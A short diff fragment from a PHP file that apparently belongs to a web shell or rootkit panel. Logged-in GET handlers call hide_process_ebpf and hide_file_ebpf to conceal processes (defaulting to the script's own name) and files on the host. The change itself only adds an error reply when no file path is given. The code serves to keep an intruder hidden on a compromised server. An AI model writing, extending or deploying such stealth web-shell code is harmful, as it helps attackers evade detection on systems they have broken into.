     $proc = isset($_GET['process']) ? $_GET['process'] : basename(__FILE__);
     $result = hide_process_ebpf($proc);
@@ -2875,6 +2836,8 @@ if (isset($_GET['hide_file_ebpf']) && isset($_SESSION['loggedin']) && $_SESSION[
     if (!empty($file)) {
         $result = hide_file_ebpf($file);
         sendJsonResponse($result);
+    } else {
+        sendJsonResponse(['status' => 'error', 'message' => 'File path required']);
     }
 }
 
